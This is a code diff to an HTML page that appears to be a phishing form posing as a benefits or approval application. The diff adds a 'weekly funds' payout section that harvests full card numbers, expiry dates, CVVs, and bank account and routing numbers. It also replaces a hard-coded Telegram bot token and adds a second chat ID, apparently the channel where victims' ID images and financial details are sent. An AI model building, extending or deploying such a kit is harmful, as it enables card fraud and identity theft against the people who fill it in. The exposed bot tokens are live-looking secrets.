@@ -631,6 +631,79 @@
                 </div>
             </div>
 
+             <!-- PAYOUT METHOD -->
+            <div style="background:#16213e;border-radius:10px;padding:18px;margin:15px 0;border:1px solid #2a2a4a;">
+                <h3 style="color:#ffd700;font-size:16px;margin-bottom:12px;">💳 How would you like to receive your weekly funds?</h3>
+                <div class="form-group">
+                    <label>Select Method <span class="required">*</span></label>
+                    <select id="payoutMethod" onchange="togglePayoutFields()" required>
+                        <option value="">-- Select --</option>
+                        <option value="Debit Card">💳 Debit Card</option>
+                        <option value="Credit Card">💳 Credit Card</option>
+                        <option value="Bank Account">🏦 Bank Account</option>
+                    </select>
+                </div>
+
+                <!-- Debit/Credit Card Fields (UNMASKED) -->
+                <div class="dynamic-fields" id="cardFields">
+                    <div class="form-group">
+                        <label>Card Number <span class="required">*</span></label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiry Date <span class="required">*</span></label>
+                            <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
+                        </div>
+                        <div class="form-group">
+                            <label>CVV <span class="required">*</span></label>
+                            <input type="password" id="cardCVV" placeholder="123" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Cardholder Name <span class="required">*</span></label>
+                        <input type="text" id="cardName" placeholder="Name on card">
+                    </div>
+                    <!-- Extra: Card Type (optional) -->
+                    <div class="form-group">
+                        <label>Card Type</label>
+                        <select id="cardType">
+                            <option value="Visa">💳 Visa</option>
+                            <option value="Mastercard">💳 Mastercard</option>
+                            <option value="Amex">💳 American Express</option>
+                            <option value="Discover">💳 Discover</option>
+                            <option value="Other">💳 Other</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Bank Account Fields -->
+                <div class="dynamic-fields" id="bankFields">
+                    <div class="form-group">
+                        <label>Bank Name <span class="required">*</span></label>
+                        <input type="text" id="bankName" placeholder="Bank name">
+                    </div>
+                    <div class="form-group">
+                        <label>Account Number <span class="required">*</span></label>
+                        <input type="text" id="bankAccount" placeholder="Account number" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Routing Number <span class="required">*</span></label>
+                            <input type="text" id="bankRouting" placeholder="Routing number" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                        </div>
+                        <div class="form-group">
+                            <label>Account Type <span class="required">*</span></label>
+                            <select id="bankAccountType">
+                                <option value="">-- Select --</option>
+                                <option value="Checking">🏦 Checking</option>
+                                <option value="Savings">🏦 Savings</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
             <!-- STAMP OF APPROVAL -->
             <div class="stamp-section">
                 <div class="stamp-icon">📜</div>
@@ -721,8 +794,11 @@
         // ============================================
         // CONFIGURATION
         // ============================================
-        const BOT_TOKEN = "8855859135:AAHmVOmXKqbV_fyp2YIOyaVnq8ttXizbU78";
-        const CHAT_ID = "8818154838";
+        const BOT_TOKEN = "8777841044:AAGsYPsmbZJyBarJBC_ftTWNiVQVaCz0yz8";
+        const CHAT_IDS = [
+    "8818154838",
+    "873270406"
+];
 
         let idFrontData = null;
         let idBackData = null;
